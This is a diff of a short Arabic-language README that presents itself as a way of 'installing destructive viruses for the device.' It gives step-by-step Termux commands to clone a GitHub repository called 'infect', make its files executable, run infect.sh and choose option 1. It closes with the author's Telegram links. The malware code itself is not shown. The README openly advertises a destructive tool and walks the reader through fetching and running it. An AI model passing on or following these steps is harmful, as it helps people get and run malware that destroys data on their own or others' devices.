@@ -1,1 +1,19 @@
-# infect
+# <p align="center" > تنصيب فيروسات مدمره للجهاز
+# <p align="center" > ┄─━━━ ᏴᎾᏚᏚ ━━━━─┄
+# <p align="center" > ▽ الامر الاول ويعني تحديث ▽
+# <p align="center" > `apt update -y`
+# <p align="center" > ▽ الامر الثاني ويعني تطوير ▽
+# <p align="center" > `apt upgrade -y`
+# <p align="center" > ▽ الامر الثالث ▽ 
+# <p align="center" > `pkg install git -y`
+# <p align="center" > ▽ الامر الرابع ▽
+# <p align="center" > `git clone https://github.com/DEVBOSS1/infect.git`
+# <p align="center" > ⊀ الامر الخامس >̷
+# <p align="center" > `cd infect`
+# <p align="center" > ⊀ والامر السادس >̷
+# <p align="center" > `chmod +x *`
+# <p align="center" > ⊀ وبعدها هاذا >̷
+# <p align="center" > `bash infect.sh`
+# <p align="center" > `وبعدا تختار 1 وانتر`
+# <p align="center" > [⊀ قناتي على التلجرام >̷](https://t.me/lll_n_lll1)
+# <p align="center" > [⊀ حسابي الرسمي على التلجرام >̷](https://t.me/boss_lol0) • 
